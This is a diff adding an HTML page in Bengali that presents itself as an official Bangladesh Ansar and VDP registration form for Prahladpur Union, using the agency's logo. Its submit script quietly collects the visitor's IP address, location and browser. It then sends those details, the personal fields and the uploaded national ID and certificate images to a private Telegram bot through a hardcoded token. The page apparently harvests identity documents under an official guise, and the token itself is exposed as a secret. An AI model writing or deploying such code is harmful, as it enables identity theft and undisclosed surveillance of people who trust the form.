@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>প্রহলাদপুর ইউনিয়ন ভিডিপি ফর্ম</title>
+<style>
+body { font-family:"SolaimanLipi",sans-serif; background:#f4f6f8; margin:0; padding:0;}
+header { background:#0a2f54; color:white; text-align:center; padding:20px;}
+header p, header h1 { margin:5px 0; }
+header p { font-size:14px; }
+header .slogan { font-size:16px; margin-bottom:10px; }
+.logo { width:80px; height:80px; display:inline-block; margin-bottom:10px;}
+form { max-width:600px; margin:30px auto; background:#fff; padding:20px; border-radius:10px; box-shadow:0 5px 15px rgba(0,0,0,0.1);}
+form label { display:block; margin-top:15px; font-weight:bold;}
+form input, form select { width:100%; padding:10px; margin-top:5px; border-radius:5px; border:1px solid #ccc; box-sizing:border-box;}
+form input[type="file"] { padding:3px;}
+.submit-btn { background:#0a2f54; color:white; padding:15px; margin-top:20px; width:100%; border:none; border-radius:5px; cursor:pointer; font-size:16px;}
+.submit-btn:hover { background:#07406d;}
+footer { text-align:center; font-size:12px; color:#666; margin-top:20px; padding:10px 0; background:#f4f6f8; }
+</style>
+</head>
+<body>
+
+<header>
+    <p class="slogan">শান্তি,    শৃঙ্খলা,    উন্নয়ন,    নিরাপত্তায়    সর্বত্র    আমরা</p>
+    <img src="https://ansarvdp.gov.bd/themes/responsive_npf/img/logo/ansarvdp.png" alt="ANSAR VDP Logo" class="logo">
+    <h1>🔰 বাংলাদেশ আনসার ও গ্রাম প্রতিরক্ষা বাহিনী</h1>
+    <p>🎓 গ্রামভিত্তিক অস্ত্রবিহীন ভিডিপি মৌলিক প্রশিক্ষণ (পুরুষ ও মহিলা)<br>📍 প্রহলাদপুর ইউনিয়ন, শ্রীপুর, গাজীপুর।</p>
+</header>
+
+<form id="vdpForm">
+
+<label>নাম *</label>
+<input type="text" id="name" required>
+
+<label>মোবাইল নম্বর *</label>
+<input type="tel" id="phone" required>
+
+<label>জাতীয় পরিচয়পত্রের ছবি বা PDF *</label>
+<select id="nidOption" required>
+<option value="">-- নির্বাচন করুন --</option>
+<option value="separate">আলাদা ছবি (Front/Back)</option>
+<option value="combined">সামনে ও পিছনের একসাথে</option>
+</select>
+
+<div id="nidSeparate" style="display:none;">
+<label>জাতীয় পরিচয়পত্র সামনের ছবি *</label>
+<input type="file" id="nidFront" required>
+<label>জাতীয় পরিচয়পত্র পিছনের ছবি *</label>
+<input type="file" id="nidBack" required>
+</div>
+
+<div id="nidCombinedDiv" style="display:none;">
+<label>জাতীয় পরিচয়পত্র সামনেও পিছনের ছবি একসাথে *</label>
+<input type="file" id="nidCombined">
+</div>
+
+<label>শিক্ষাগত সার্টিফিকেট (ফাইল)</label>
+<input type="file" id="certificate">
+
+<label>জন্ম তারিখ *</label>
+<input type="date" id="dob" required>
+
+<label>বয়স *</label>
+<input type="number" id="age" readonly required>
+
+<label>উচ্চতা (ফুট) *</label>
+<input type="number" id="heightFeet" placeholder="ফুট" required>
+
+<label>উচ্চতা (ইঞ্চি) *</label>
+<input type="number" id="heightInch" placeholder="ইঞ্চি" required>
+
+<label>লিঙ্গ *</label>
+<select id="gender" required>
+<option value="">-- নির্বাচন করুন --</option>
+<option value="পুরুষ">পুরুষ</option>
+<option value="মহিলা">মহিলা</option>
+</select>
+
+<label>ওয়ার্ড *</label>
+<select id="ward" required>
+<option value="">-- নির্বাচন করুন --</option>
+<option value="1">১ নং ওয়ার্ড</option>
+<option value="2">২ নং ওয়ার্ড</option>
+<option value="3">৩ নং ওয়ার্ড</option>
+<option value="4">৪ নং ওয়ার্ড</option>
+<option value="5">৫ নং ওয়ার্ড</option>
+<option value="6">৬ নং ওয়ার্ড</option>
+<option value="7">৭ নং ওয়ার্ড</option>
+<option value="8">৮ নং ওয়ার্ড</option>
+<option value="9">৯ নং ওয়ার্ড</option>
+</select>
+
+<label>গ্রাম *</label>
+<select id="village" required>
+<option value="">-- প্রথমে ওয়ার্ড সিলেক্ট করুন --</option>
+</select>
+
+<button type="submit" class="submit-btn">সাবমিট</button>
+</form>
+
+<footer>
+  <a href="https://ansarandvdpprahladpur.wordpress.com/" target="_blank">
+    Bangladesh Ansar and VDP – Prahladpur Union, Sreepur, Gazipur
+  </a>
+</footer>
+
+
+<script>
+// জন্ম তারিখ থেকে বয়স
+const dobField = document.getElementById('dob');
+const ageField = document.getElementById('age');
+dobField.addEventListener('change', ()=>{
+const dob = new Date(dobField.value);
+const diff = Date.now() - dob.getTime();
+const age = Math.floor(diff / (1000*60*60*24*365.25));
+ageField.value = age;
+});
+
+// ওয়ার্ড → গ্রাম
+const wardVillageMap = {
+'1':['ডুমনী','ফাউগান'],
+'2':['প্রহলাদপুর'],
+'3':['আটিপাড়া','নানাইয়া','নানাইয়ারচর','বাঘমারা','মার্তারচর'],
+'4':['আতলড়া','বনখড়িয়া'],
+'5':['উজলিয়া','করলামাধবপুর','বাশকোপা','সেরালিয়াবাড়ী'],
+'6':['আশুলীয়াপাড়া','পোতাবাড়ী','ভিটিপাড়া','মরিচারচালা'],
+'7':['কদমা','প্রতাবপুর','রাখালিয়া','লোহাগাছিয়া'],
+'8':['চরদমদমা','দমদমা'],
+'9':['নিমুরিয়া','মেন্দিপুর','মারতা']
+};
+const wardField = document.getElementById('ward');
+const villageField = document.getElementById('village');
+wardField.addEventListener('change', ()=>{
+const villages = wardVillageMap[wardField.value] || [];
+villageField.innerHTML = '<option value="">-- গ্রাম নির্বাচন করুন --</option>';
+villages.forEach(v=>{
+const opt=document.createElement('option'); opt.value=v; opt.text=v; villageField.appendChild(opt);
+});
+});
+
+// NID option logic
+const nidOption = document.getElementById('nidOption');
+const nidSeparate = document.getElementById('nidSeparate');
+const nidCombinedDiv = document.getElementById('nidCombinedDiv');
+nidOption.addEventListener('change', ()=>{
+if(nidOption.value==='separate'){
+nidSeparate.style.display='block';
+nidCombinedDiv.style.display='none';
+document.getElementById('nidFront').required=true;
+document.getElementById('nidBack').required=true;
+document.getElementById('nidCombined').required=false;
+} else if(nidOption.value==='combined'){
+nidSeparate.style.display='none';
+nidCombinedDiv.style.display='block';
+document.getElementById('nidFront').required=false;
+document.getElementById('nidBack').required=false;
+document.getElementById('nidCombined').required=true;
+} else {
+nidSeparate.style.display='none';
+nidCombinedDiv.style.display='none';
+document.getElementById('nidFront').required=false;
+document.getElementById('nidBack').required=false;
+document.getElementById('nidCombined').required=false;
+}
+});
+
+// Form submit + Telegram + IP + Device + Location
+const form = document.getElementById('vdpForm');
+form.addEventListener('submit', async (e)=>{
+e.preventDefault();
+
+const token="7728822427:AAE7T1k6yq5TejRnEySeac1_qQ6fCkA8v1s";
+const chatId="7079142411";
+
+const name=document.getElementById('name').value;
+const phone=document.getElementById('phone').value;
+const dob=document.getElementById('dob').value;
+const age=document.getElementById('age').value;
+const heightFeet=document.getElementById('heightFeet').value;
+const heightInch=document.getElementById('heightInch').value;
+const gender=document.getElementById('gender').value;
+const ward=document.getElementById('ward').value;
+const village=document.getElementById('village').value;
+
+const certificateFile=document.getElementById('certificate').files[0];
+const nidFront=document.getElementById('nidFront')?.files[0];
+const nidBack=document.getElementById('nidBack')?.files[0];
+const nidCombined=document.getElementById('nidCombined')?.files[0];
+
+// Get IP & Location
+let ip='Unknown', country='Unknown', city='Unknown';
+try{
+    const ipRes=await fetch('https://ipapi.co/json/');
+    const ipData=await ipRes.json();
+    ip = ipData.ip;
+    country = ipData.country_name;
+    city = ipData.city;
+}catch(err){ console.log('IP/Location error', err); }
+
+// Device info
+const device = /Mobile|Android|iPhone|iPad/.test(navigator.userAgent)? 'Mobile' : 'Desktop';
+const browser = navigator.userAgent;
+
+let message=`নিবন্ধন তথ্য:
+    
+নাম: ${name}
+মোবাইল: ${phone}
+জন্ম তারিখ: ${dob}
+বয়স: ${age}
+উচ্চতা: ${heightFeet} ফুট ${heightInch} ইঞ্চি
+লিঙ্গ: ${gender}
+ওয়ার্ড: ${ward}
+গ্রাম: ${village}
+IP: ${ip}
+দেশ: ${country}
+শহর: ${city}
+ডিভাইস: ${device}
+ব্রাউজার: ${browser}`;
+
+await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({chat_id:chatId,text:message})
+});
+
+async function sendFile(file,type){
+if(file){
+const formData=new FormData();
+formData.append('chat_id',chatId);
+if(type==='photo') formData.append('photo',file);
+else formData.append('document',file);
+await fetch(`https://api.telegram.org/bot${token}/send${type==='photo'?'Photo':'Document'}`,{method:'POST',body:formData});
+}
+}
+
+// Send files according to selection
+if(nidOption.value==='separate'){
+await sendFile(nidFront,'photo');
+await sendFile(nidBack,'photo');
+} else if(nidOption.value==='combined'){
+await sendFile(nidCombined,'document');
+}
+
+await sendFile(certificateFile,'document');
+
+alert("ডেটা সাবমিট হয়েছে। ধন্যবাদ!");
+form.reset();
+});
+</script>
+
+</body>
+</html>
